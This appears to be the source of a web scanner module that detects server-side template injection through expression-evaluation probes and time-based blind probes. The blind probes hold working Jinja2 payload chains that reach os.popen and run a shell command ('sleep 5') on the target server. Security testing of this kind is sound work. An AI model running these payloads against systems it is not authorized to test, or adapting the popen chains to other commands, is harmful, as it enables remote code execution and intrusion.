"""SSTI detection -- expression evaluation + time-based blind."""
import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

from scanner.modules.base import BaseModule
from scanner.core.html_utils import _extract_params, _make_test_url
from scanner.core.encoding import generate_variants


SSTI_TECHNIQUES = []

# ── Expression Evaluation Payloads ──────────────────────────────────

_SSTI_PAYLOADS = [
    # (payload, engine, expected_output)
    ("{{7*7}}", "Jinja2/Twig", "49"),
    ("${7*7}", "Freemarker", "49"),
    ("<%= 7*7 %>", "ERB", "49"),
    ("#set($x=7*7)$x", "Velocity", "49"),
    ("{{7*'7'}}", "Jinja2", "7777777"),
    ("{{config}}", "Jinja2", None),       # object leak
    ("{{self}}", "Jinja2", None),          # object leak
    ("{{_self}}", "Twig", None),           # object leak
]

# ── Time-Based Sleep Payloads ──────────────────────────────────────

_SSTI_SLEEP_PAYLOADS = [
    ("{{config.__init__.__globals__.__builtins__.__import__('os').popen('sleep 5').read()}}", "Jinja2"),
    ("{{self.__init__.__globals__.__builtins__.__import__('os').popen('sleep 5').read()}}", "Jinja2"),
    ("{{lipsum.__globals__.__builtins__.__import__('os').popen('sleep 5').read()}}", "Jinja2"),
    ("{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}", "Jinja2"),
]

DEFAULT_THRESHOLD = 5

# ── Object Leak Patterns ───────────────────────────────────────────

_OBJECT_LEAK_PATTERNS = [
    r"<Config\s*\{",
    r"<TemplateReference\s",
    r"<Environment\s",
    r"<Undefined>",
    r"<class\s+'[^']*\.Template",
    r"<module\s+'[^']*\.environment",
]


# ── Pure Functions ─────────────────────────────────────────────────

def _check_ssti_output(text, expected):
    """Check if expected evaluated output appears in response text.

    Uses word boundary check to avoid matching substrings
    (e.g., '49' inside '1490').
    """
    return bool(re.search(r'\b' + re.escape(expected) + r'\b', text))


def _check_object_leak(text):
    """Check if template engine internal objects leaked in response."""
    for pat in _OBJECT_LEAK_PATTERNS:
        if re.search(pat, text):
            return True
    return False


def _build_baseline_time(url, send_request):
    """Send 3 normal requests, return average response time in seconds."""
    times = []
    for _ in range(3):
        start = time.perf_counter()
        try:
            send_request(url)
        except Exception:
            pass
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return sum(times) / len(times) if times else 0.0


# ── SstiModule ─────────────────────────────────────────────────────

class SstiModule(BaseModule):
    name = "ssti"
    description = "Detect server-side template injection via expression eval + time blind"
    requires_url = True

    def run(self, target, request_handler, output, threads=10):
        """Run SSTI detection."""
        target = target.rstrip("/")
        output.log_progress(f"Fetching {target} for parameter extraction...")

        try:
            resp = request_handler.get(target)
            html = resp.text
        except Exception as e:
            output.log_progress(f"Failed to fetch {target}: {e}")
            return {"module": self.name, "findings": []}

        param_names = _extract_params(target, html)

        if not param_names:
            parsed = urllib.parse.urlparse(target)
            if parsed.query:
                param_names = [
                    {"name": k, "method": "GET"}
                    for k in urllib.parse.parse_qs(parsed.query).keys()
                ]

        if not param_names:
            output.log_progress("No testable parameters found on this page")
            return {"module": self.name, "findings": []}

        param_list = [f"{p['name']}({p['method']})" for p in param_names]
        output.log_progress(
            f"Found {len(param_names)} potential parameters: {param_list}"
        )

        findings = []
        param_has_finding = set()

        # Phase 1: Expression evaluation
        output.log_progress(
            f"Phase 1: Expression evaluation ({len(_SSTI_PAYLOADS)} payloads)"
        )
        with ThreadPoolExecutor(max_workers=max(2, min(threads, 10))) as pool:
            futures = {}
            for entry in param_names:
                pname = entry["name"]
                method = entry["method"]
                for payload, engine, expected in _SSTI_PAYLOADS:
                    for encoded, tech in generate_variants(payload, SSTI_TECHNIQUES):
                        if method == "POST":
                            test_url = target
                            futures[pool.submit(
                                request_handler.post, target,
                                data={pname: encoded}
                            )] = (pname, payload, engine, expected, test_url, tech)
                        else:
                            test_url = _make_test_url(target, pname, encoded)
                            futures[pool.submit(
                                request_handler.get, test_url
                            )] = (pname, payload, engine, expected, test_url, tech)

            bar = output.create_progress_bar("SSTI-Expr", len(futures))
            for future in as_completed(futures):
                pname, payload, engine, expected, test_url, tech = futures[future]
                try:
                    resp = future.result()
                    matched = False
                    evidence = ""

                    if expected is not None:
                        if _check_ssti_output(resp.text, expected):
                            matched = True
                            evidence = (
                                f"Evaluated '{payload}' → '{expected}' "
                                f"found in response ({engine})"
                            )
                    else:
                        if _check_object_leak(resp.text):
                            matched = True
                            evidence = (
                                f"Template object leaked by '{payload}' "
                                f"({engine})"
                            )

                    if matched and pname not in param_has_finding:
                        param_has_finding.add(pname)
                        finding = {
                            "type": "expression_eval",
                            "parameter": pname,
                            "url": test_url,
                            "engine": engine,
                            "payload": payload,
                            "encoding": tech,
                            "evidence": evidence,
                        }
                        findings.append(finding)
                        output.log_finding(self.name, finding)
                except Exception:
                    pass
                output.update_progress(bar)
            bar.close()

        # Phase 2: Time-based blind
        time_targets = [
            e for e in param_names if e["name"] not in param_has_finding
        ]
        if time_targets:
            output.log_progress(
                f"Phase 2: Time-based blind ({len(time_targets)} params, "
                f"{len(_SSTI_SLEEP_PAYLOADS)} payloads)"
            )
            with ThreadPoolExecutor(max_workers=max(2, min(threads, 10))) as pool:
                param_baselines = {}
                for entry in time_targets:
                    pname = entry["name"]
                    if entry["method"] == "POST":
                        baseline = _build_baseline_time(
                            target,
                            lambda u, n=pname: request_handler.post(u, data={n: "1"})
                        )
                    else:
                        base_url = _make_test_url(target, pname, "1")
                        baseline = _build_baseline_time(base_url, request_handler.get)
                    param_baselines[pname] = baseline
                    output.log_progress(f"  {pname} baseline: {baseline*1000:.0f}ms")

                futures = {}
                for entry in time_targets:
                    pname = entry["name"]
                    for sleep_payload, engine in _SSTI_SLEEP_PAYLOADS:
                        for encoded, tech in generate_variants(sleep_payload, SSTI_TECHNIQUES):
                            if entry["method"] == "POST":
                                test_url = target
                                futures[pool.submit(
                                    self._timed_request,
                                    lambda u, n=pname, pl=encoded: (
                                        request_handler.post(u, data={n: pl})
                                    ),
                                    target
                                )] = (pname, engine, sleep_payload, test_url,
                                      param_baselines[pname], tech)
                            else:
                                test_url = _make_test_url(target, pname, encoded)
                                futures[pool.submit(
                                    self._timed_request,
                                    request_handler.get, test_url
                                )] = (pname, engine, sleep_payload, test_url,
                                      param_baselines[pname], tech)

                bar = output.create_progress_bar("SSTI-Time", len(futures))
                for future in as_completed(futures):
                    pname, engine, payload, test_url, baseline, tech = futures[future]
                    try:
                        elapsed = future.result()
                        threshold = max(baseline * 3, DEFAULT_THRESHOLD)
                        if elapsed is not None and elapsed > threshold:
                            finding = {
                                "type": "time_based",
                                "parameter": pname,
                                "url": test_url,
                                "engine": engine,
                                "encoding": tech,
                                "baseline_ms": round(baseline * 1000),
                                "response_ms": round(elapsed * 1000),
                                "evidence": (
                                    f"Response delayed {elapsed*1000:.0f}ms "
                                    f"vs baseline {baseline*1000:.0f}ms "
                                    f"({engine})"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                    except Exception:
                        pass
                    output.update_progress(bar)
                bar.close()

        output.log_progress(
            f"SSTI done: {len(findings)} potential injections found"
        )
        return {"module": self.name, "findings": findings}

    def _timed_request(self, get_func, url):
        """Make a request and return elapsed time in seconds, or None on failure."""
        start = time.perf_counter()
        try:
            get_func(url)
            return time.perf_counter() - start
        except Exception:
            return None
